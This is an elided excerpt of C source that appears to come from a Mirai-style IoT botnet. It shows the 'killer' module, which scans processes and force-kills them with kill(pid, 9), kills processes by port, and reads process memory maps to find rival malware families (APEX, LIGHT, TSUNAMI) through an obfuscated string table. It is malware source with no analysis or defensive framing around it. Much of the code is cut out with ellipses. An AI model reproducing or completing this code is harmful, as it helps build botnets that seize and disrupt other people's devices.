...
void killer_init(void)
{
    ...
    #ifdef DEBUG
        printf("[killer] maps scanning processes\n");
    #endif
    ...
    while(TRUE)
    {
        ...
        while((file = readdir(dir)) != NULL)
        {
            ...
            {
#ifdef DEBUG
            printf("[killer] found and demolished %d\n", pid);
#endif
                kill(pid, 9);
            }
...
BOOL killer_kill_by_port(port_t port)
{
    ...
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE); table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);
...
static BOOL maps_scan_match(char *path)
{
    ...
    table_unlock_val(TABLE_MAPS_APEX);
    table_unlock_val(TABLE_MAPS_LIGHT);
    table_unlock_val(TABLE_MAPS_TSUNAMI);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MAPS_APEX, NULL), util_strlen(table_retrieve_val(TABLE_MAPS_APEX, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MAPS_LIGHT, NULL), util_strlen(table_retrieve_val(TABLE_MAPS_LIGHT, NULL))) ||
            mem_exists(rdbuf, ret, table_retrieve_val(TABLE_MAPS_TSUNAMI, NULL), util_strlen(table_retrieve_val(TABLE_MAPS_TSUNAMI, NULL))))
        {
            found = TRUE;
            break;
        }
    ...
    table_lock_val(TABLE_MAPS_APEX);
    table_lock_val(TABLE_MAPS_LIGHT);
    table_lock_val(TABLE_MAPS_TSUNAMI);
